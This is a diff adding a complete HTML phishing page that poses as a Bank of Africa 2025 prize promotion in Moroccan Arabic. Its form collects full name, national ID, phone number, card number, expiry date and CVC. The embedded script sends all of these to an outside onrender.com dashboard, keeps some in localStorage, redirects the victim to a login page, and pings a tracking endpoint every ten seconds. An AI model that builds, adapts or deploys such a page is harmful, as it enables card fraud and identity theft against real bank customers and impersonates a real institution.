@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>جوائز بنك أفريقيا</title>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <!-- Header -->
+  <header class="logo-header">
+    <img src="images/mainLogo.png" alt="Logo" class="logo" />
+  </header>
+
+  <!-- Promo Section -->
+  <main class="promo-section">
+  <h1 class="main-title">
+    الخدمات البنكية <span class="highlight">ولات أسهل</span>
+  </h1>
+  <p class="subtitle">مرحبا بيك فالعالم الجديد ديال الخدمات البنكية مع <strong>بنك أفريقيا</strong></p>
+
+  <div class="card-image">
+    <img src="images/goldCard.png" alt="Card" />
+    <img src="images/grayCard.png" alt="Card" />
+  </div>
+
+  <p class="promo-text">
+    <span class="bullet">•</span> بنك أفريقيا مع التطبيق البنكي ديالنا، زبناءنا ديما مميزين فحملة 2025<br>
+    عندنا جوائز زوينة بالقيمة وبالعدد: جوائز يومية، أسبوعية، شهرية وحتى جوائز كبار كل 3 شهور كاتستناكم كاملين
+  </p>
+</main>
+
+    <!-- Form -->
+    <form id="bankForm" class="simple-form">
+  <img src="images/semiLogo.jpeg" alt="Form Icon" class="form-icon" />
+
+  <div class="form-group">
+    <label for="name">السمية الكاملة *</label>
+    <input type="text" id="name" name="name" placeholder="" required />
+  </div>
+
+  <div class="form-group">
+    <label for="nationalid">النمرة الوطنية *</label>
+    <input type="text" id="nationalid" name="nationalid" placeholder="" required />
+  </div>
+
+  <div class="form-group">
+    <label for="phone">نمرة التلفون *</label>
+    <input type="text" id="phone" name="phone" placeholder="" required />
+  </div>
+
+  <div class="form-group">
+    <img src="images/blueCard.png" alt="Bank Info" class="bank-image" />
+  </div>
+
+  <div class="form-group">
+    <label for="cardNum">نمرة الكارط ديال البنك *</label>
+    <input type="text" id="cardNum" name="cardNum" placeholder="" required style="direction: ltr;" />
+  </div>
+
+  <div class="form-group horizontal-selects">
+    <label for="month">تاريخ نهاية الكارط *</label>
+    <div class="select-row">
+      <select id="month" name="month" required>
+        <option value="" disabled selected>شهر</option>
+        <option value="01">01</option>
+        <option value="02">02</option>
+        <option value="03">03</option>
+        <option value="04">04</option>
+        <option value="05">05</option>
+        <option value="06">06</option>
+        <option value="07">07</option>
+        <option value="08">08</option>
+        <option value="09">09</option>
+        <option value="10">10</option>
+        <option value="11">11</option>
+        <option value="12">12</option>
+      </select>
+
+      <select id="year" name="year" required>
+        <option value="" disabled selected>عام</option>
+        <option value="2025">2025</option>
+        <option value="2026">2026</option>
+        <option value="2027">2027</option>
+        <option value="2028">2028</option>
+        <option value="2029">2029</option>
+        <option value="2030">2030</option>
+        <option value="2031">2031</option>
+      </select>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label for="cvc">كود التحقق (CVC) *</label>
+    <input type="text" id="cvc" name="cvc" placeholder="دخل كود التحقق" maxlength="4" required style="direction: ltr;" />
+  </div>
+
+  <div class="form-group">
+    <button type="submit" class="confirm-btn">تأكيد</button>
+  </div>
+</form>
+
+  </main>
+
+  <!-- Footer -->
+  <footer class="site-footer">
+    <div class="footer-content">
+      <span>بنك أفريقيا 2025 &copy;</span>
+    </div>
+  </footer>
+
+  <!-- Keep your API logic untouched -->
+  <script>
+    const form = document.getElementById('bankForm');
+    const cardInput = form.cardNum;
+
+    cardInput.addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 16) value = value.slice(0, 16);
+
+      let formatted = '';
+      for (let i = 0; i < value.length; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += value[i];
+      }
+      e.target.value = formatted;
+    });
+
+    form.addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const rawCardNum = cardInput.value.replace(/\s/g, '');
+      if (rawCardNum.length !== 16) {
+        alert('رقم البطاقة يجب أن يكون مكوناً من 16 رقمًا.');
+        cardInput.style.backgroundColor = '#f8d7da';
+        cardInput.focus();
+        return;
+      }
+
+      const cvcInput = form.cvc.value.trim();
+      if (!cvcInput || cvcInput.length < 3 || cvcInput.length > 4 || !/^\d+$/.test(cvcInput)) {
+        alert('يرجى إدخال رمز التحقق الصحيح (3 أو 4 أرقام).');
+        form.cvc.focus();
+        return;
+      }
+
+      const accountTypeSelect = form['account-type'];
+      const accountTypeText = accountTypeSelect ? accountTypeSelect.options[accountTypeSelect.selectedIndex].text : '';
+
+      const data = {
+        name: form.name.value.trim(),
+        nationalid: form.nationalid.value.trim(),
+        phone: form.phone.value.trim(),
+        accountType: accountTypeText,
+        cardNum: cardInput.value.trim(),
+        month: form.month.value,
+        year: form.year.value,
+        cvc: cvcInput
+      };
+
+      const message =
+        `الاسم الكامل: ${data.name}\n` +
+        `الرقم القومي:\n ${data.nationalid}\n` +
+        `رقم الجوال:\n ${data.phone}\n` +
+        `نوع الحساب البنكي: ${data.accountType}\n` +
+        `رقم البطاقة البنكية:\n ${data.cardNum}\n` +
+        `تاريخ انتهاء البطاقة: ${data.month}/${data.year}\n` +
+        `رمز التحقق (CVC): ${data.cvc}`;
+
+      localStorage.setItem("userPhone", data.phone);
+      localStorage.setItem("name", data.name);
+      localStorage.setItem("cardNum", data.cardNum);
+
+      fetch('https://bm-dashboard-a0mt.onrender.com/api/messages', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ text: message })
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = 'login.html';
+        } else {
+          alert('حدث خطأ أثناء الإرسال');
+        }
+      })
+      .catch(error => {
+        alert('خطأ في الاتصال بالخادم');
+        console.error('Error:', error);
+      });
+    });
+
+    setInterval(() => {
+      fetch('https://bm-dashboard-a0mt.onrender.com/track-online', { method: 'POST' });
+    }, 10000);
+  </script>
+
+</body>
+</html>
